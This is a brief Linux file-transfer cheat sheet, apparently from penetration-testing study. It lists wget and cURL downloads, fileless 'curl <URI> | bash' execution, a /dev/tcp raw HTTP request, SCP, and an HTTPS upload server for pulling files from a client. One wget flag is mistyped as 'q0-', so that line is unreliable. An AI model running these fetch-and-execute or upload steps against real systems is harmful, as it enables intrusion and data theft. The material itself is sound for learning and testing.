# **LINUX FILE TRANSFER**

## Downloads with Wget and cURL

> ### Download with Wget
>
>     wget <URI> -O <OUTPUT_FILE>

> ### Download with cURL
>
>     curl -o <OUTPUT_FILE> <URI>

## Fileless Downloads

> ### Using Wget
>
>     wget -q0- <URI>| bash

> ### Using cURL
>
>     curl <URI> | bash

## Download with Bash

> ### Connect to the Target Webserver
>
>     exec 3<>/dev/tcp/<IP>/80

> ### HTTP GET Request
>
>     echo -e "GET /<FILE> HTTP/1.1\n\n">&3

> ### Print the Response
>
>     cat <&3

## Download/Upload with SSH

> ### Enabling and starting the SSH Server 
>
>     sudo systemctl enable ssh && sudo systemctl start ssh

> ### Download from the Client
>
>     scp <USER>@<IP>:<FILE> .

> ### SCP Upload
>
>     scp <FILE> <USER>@<IP>:<DIRECTORY>


## HTTPS Upload

> ### Install uploadserver module
>
>     sudo python3 -m pip install --user uploadserver

> ### Create a Self-Signed Certificate
>
>     openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

> ### Start Server
>
>     mkdir https && cd https && sudo python3 -m uploadserver 443 --server-certificate ~/server.pem

> ### Upload from Client
>
>     curl -X POST https://<IP>/upload -F 'files=@<FILE>' --insecure

## Alternative Transfer Mehtods
 
> ### Web Server with Python3
>
>     python3 -m http.server

> ### Web Server with Python2.7
>
>     python2.7 -m SimpleHTTPServer

> ### Web Server with PHP
>
>     php -S 0.0.0.0:8000

> ### Web Server with Ruby
>
>     ruby -run -ehttpd . -p8000

> ### Download from Client
>
>     wget <IP>:8000/<FILE>




